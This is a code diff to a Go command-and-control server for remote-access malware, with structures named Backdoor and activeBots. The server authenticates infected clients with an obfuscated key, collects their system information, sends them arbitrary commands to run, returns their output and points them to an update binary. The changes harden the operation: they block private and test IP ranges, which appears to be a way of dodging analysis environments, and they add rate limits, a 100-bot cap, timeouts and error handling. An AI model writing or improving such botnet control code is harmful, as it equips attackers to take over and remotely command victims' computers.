@@ -82,6 +82,8 @@ var (
 	currentVersion = "1.0.0"                // Current server version
 	binaryChecksum = ""                     // Client binary checksum
 	updateURL = "https://example.com/client/latest" // Update server URL
+	connectionAttempts = make(map[string]time.Time)    // Track connection attempts per IP
+	failedAttempts = make(map[string]int)             // Track failed authentication attempts
 )
 
 // Function for TLS configuration setup
@@ -110,16 +112,71 @@ func validateConnection(conn net.Conn) bool {
 	
 	// List of suspicious IP ranges to block
 	suspiciousIPs := []string{
-		"0.0.0.0", "127.0.0.1", "192.168.", "10.", "172.16.",
+		"0.0.0.0/8",      // Current network
+		"10.0.0.0/8",     // Private network
+		"100.64.0.0/10",  // Carrier-grade NAT
+		"127.0.0.0/8",    // Loopback
+		"169.254.0.0/16", // Link-local
+		"172.16.0.0/12",  // Private network
+		"192.0.0.0/24",   // IETF Protocol
+		"192.0.2.0/24",   // TEST-NET-1
+		"192.88.99.0/24", // 6to4 Relay
+		"192.168.0.0/16", // Private network
+		"198.18.0.0/15",  // Network benchmark
+		"198.51.100.0/24",// TEST-NET-2
+		"203.0.113.0/24", // TEST-NET-3
+		"224.0.0.0/4",    // Multicast
+		"240.0.0.0/4",    // Reserved
+		"255.255.255.255/32", // Broadcast
 	}
 	
-	// Check if client IP is in suspicious range
-	for _, ip := range suspiciousIPs {
-		if strings.HasPrefix(remoteIP, ip) {
+	// Parse remote IP
+	ip := net.ParseIP(remoteIP)
+	if ip == nil {
+		fmt.Printf("Invalid IP address format: %s\n", remoteIP)
+		return false
+	}
+	
+	// Check against suspicious ranges
+	for _, cidr := range suspiciousIPs {
+		_, ipNet, err := net.ParseCIDR(cidr)
+		if err != nil {
+			continue
+		}
+		if ipNet.Contains(ip) {
+			fmt.Printf("Connection from suspicious IP range (%s): %s\n", cidr, remoteIP)
 			return false
 		}
 	}
 	
+	// Rate limiting per IP
+	mutex.Lock()
+	defer mutex.Unlock()
+	
+	// Clean up old entries
+	now := time.Now()
+	for ip, lastConn := range connectionAttempts {
+		if now.Sub(lastConn) > time.Hour {
+			delete(connectionAttempts, ip)
+			delete(failedAttempts, ip)
+		}
+	}
+	
+	// Check connection rate
+	if lastConn, exists := connectionAttempts[remoteIP]; exists {
+		if now.Sub(lastConn) < time.Minute {
+			fmt.Printf("Connection rate limit exceeded for %s\n", remoteIP)
+			return false
+		}
+	}
+	
+	// Check failed attempts
+	if attempts, exists := failedAttempts[remoteIP]; exists && attempts >= 5 {
+		fmt.Printf("Too many failed attempts from %s\n", remoteIP)
+		return false
+	}
+	
+	connectionAttempts[remoteIP] = now
 	return true
 }
 
@@ -157,16 +214,21 @@ func calculateChecksum(filePath string) (string, error) {
 func handleConnection(conn net.Conn) {
 	defer conn.Close()
 
-	// Set connection timeout
+	// Set initial connection timeout
 	conn.SetDeadline(time.Now().Add(Timeout))
 
+	// Limit read buffer size
+	reader := bufio.NewReaderSize(conn, 4096)
+	
 	// Authenticate client
-	reader := bufio.NewReader(conn)
 	key, err := reader.ReadString('\n')
 	if err != nil {
 		fmt.Printf("Authentication error: %v\n", err)
 		return
 	}
+
+	// Update timeout after successful read
+	conn.SetDeadline(time.Now().Add(Timeout))
 
 	// Validate authentication key
 	if deobfuscate(strings.TrimSpace(key)) != SecretKey {
@@ -177,11 +239,17 @@ func handleConnection(conn net.Conn) {
 	// Receive and parse system information
 	sysInfo, err := reader.ReadString('\n')
 	if err != nil {
+		fmt.Printf("System info error: %v\n", err)
 		return
 	}
+	
+	// Update timeout
+	conn.SetDeadline(time.Now().Add(Timeout))
+
 	sysInfo = strings.TrimSpace(deobfuscate(sysInfo))
 	parts := strings.Split(sysInfo, "|")
 	if len(parts) != 7 {
+		fmt.Printf("Invalid system info format\n")
 		return
 	}
 
@@ -202,8 +270,13 @@ func handleConnection(conn net.Conn) {
 		IsDebug:    false,
 	}
 
-	// Register new client
+	// Check maximum connections
 	mutex.Lock()
+	if len(activeBots) >= 100 { // Limit to 100 concurrent connections
+		mutex.Unlock()
+		fmt.Printf("Maximum connections reached, rejecting %s\n", backdoor.ID)
+		return
+	}
 	activeBots[backdoor.ID] = backdoor
 	mutex.Unlock()
 
@@ -212,6 +285,9 @@ func handleConnection(conn net.Conn) {
 
 	// Main command handling loop
 	for {
+		// Update timeout before each read
+		conn.SetDeadline(time.Now().Add(Timeout))
+		
 		command, err := reader.ReadString('\n')
 		if err != nil {
 			break
@@ -222,19 +298,29 @@ func handleConnection(conn net.Conn) {
 		// Handle special commands
 		switch {
 		case strings.HasPrefix(command, "check_update:"):
-			handleUpdateCheck(backdoor, command)
+			if err := handleUpdateCheck(backdoor, command); err != nil {
+				fmt.Printf("Update check error for %s: %v\n", backdoor.ID, err)
+			}
 			
 		case command == "get_checksum":
-			handleChecksumRequest(backdoor)
+			if err := handleChecksumRequest(backdoor); err != nil {
+				fmt.Printf("Checksum error for %s: %v\n", backdoor.ID, err)
+			}
 			
 		case command == "get_binary":
-			handleBinaryRequest(backdoor)
+			if err := handleBinaryRequest(backdoor); err != nil {
+				fmt.Printf("Binary request error for %s: %v\n", backdoor.ID, err)
+			}
 			
 		case command == "heartbeat":
-			handleHeartbeat(backdoor)
+			if err := handleHeartbeat(backdoor); err != nil {
+				fmt.Printf("Heartbeat error for %s: %v\n", backdoor.ID, err)
+			}
 			
 		default:
-			handleCommand(backdoor, command)
+			if err := handleCommand(backdoor, command); err != nil {
+				fmt.Printf("Command error for %s: %v\n", backdoor.ID, err)
+			}
 		}
 
 		// Update last activity timestamp
@@ -251,34 +337,39 @@ func handleConnection(conn net.Conn) {
 // Command handlers for various client requests
 
 // Handle version check and update notification
-func handleUpdateCheck(b *Backdoor, command string) {
+func handleUpdateCheck(b *Backdoor, command string) error {
 	version := strings.TrimPrefix(command, "check_update:")
 	if version < currentVersion {
 		b.Conn.Write([]byte(obfuscate(fmt.Sprintf("%s:%s:%s\n",
 			currentVersion, binaryChecksum, updateURL))))
+		return nil
 	} else {
 		b.Conn.Write([]byte(obfuscate("no_update\n")))
+		return nil
 	}
 }
 
 // Handle checksum verification request
-func handleChecksumRequest(b *Backdoor) {
+func handleChecksumRequest(b *Backdoor) error {
 	b.Conn.Write([]byte(obfuscate(binaryChecksum + "\n")))
+	return nil
 }
 
 // Handle binary download request
-func handleBinaryRequest(b *Backdoor) {
+func handleBinaryRequest(b *Backdoor) error {
 	b.Conn.Write([]byte(obfuscate(updateURL + "\n")))
+	return nil
 }
 
 // Handle client heartbeat
-func handleHeartbeat(b *Backdoor) {
+func handleHeartbeat(b *Backdoor) error {
 	b.LastSeen = time.Now()
 	b.Conn.Write([]byte(obfuscate("ok\n")))
+	return nil
 }
 
 // Handle general command execution
-func handleCommand(b *Backdoor, command string) {
+func handleCommand(b *Backdoor, command string) error {
 	// Log command execution
 	fmt.Printf("[%s] Executing command: %s\n", b.ID, command)
 	
@@ -290,10 +381,11 @@ func handleCommand(b *Backdoor, command string) {
 	result, err := reader.ReadString('\n')
 	if err != nil {
 		fmt.Printf("[Error getting result from %s]: %v\n", b.ID, err)
-		return
+		return err
 	}
 	
 	fmt.Printf("[Result from %s]:\n%s\n", b.ID, deobfuscate(strings.TrimSpace(result)))
+	return nil
 }
 
 // Monitor active clients and remove inactive ones
